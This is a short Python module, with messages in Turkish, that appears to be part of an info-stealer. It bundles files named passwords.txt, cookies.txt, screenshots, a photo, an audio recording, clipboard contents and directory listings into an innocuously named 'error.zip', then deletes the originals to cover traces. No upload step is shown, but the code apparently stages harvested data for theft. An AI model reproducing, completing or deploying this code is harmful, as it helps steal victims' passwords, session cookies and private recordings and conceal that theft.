import zipfile, os

class ZipFile:
    @staticmethod
    def ZipFile():
        try:
            files = ["taskLists.txt", "copied.txt", "output.wav", "photo.png", "screenshot.png", "passwords.txt",
                     "cookies.txt", "listdir.txt", "pwd.txt"]

            with zipfile.ZipFile("error.zip", "w") as zipF:
                for file in files:
                    if os.path.exists(file):
                        zipF.write(file)
                    else:
                        with open("error.txt", "a") as errFile:
                            errFile.write(f"{file} bulunamadı!\n")
                        errFile.close()

            zipF.close()

            with zipfile.ZipFile("error.zip", "a") as zipf:
                zipf.write("error.txt")

            zipf.close()

            os.remove("error.txt")
            for remove_file in files:
                if os.path.exists(remove_file):
                    os.remove(remove_file)
                    print(f"{remove_file} silindi!")

        except Exception as e:
            print(f"Error! {e}")
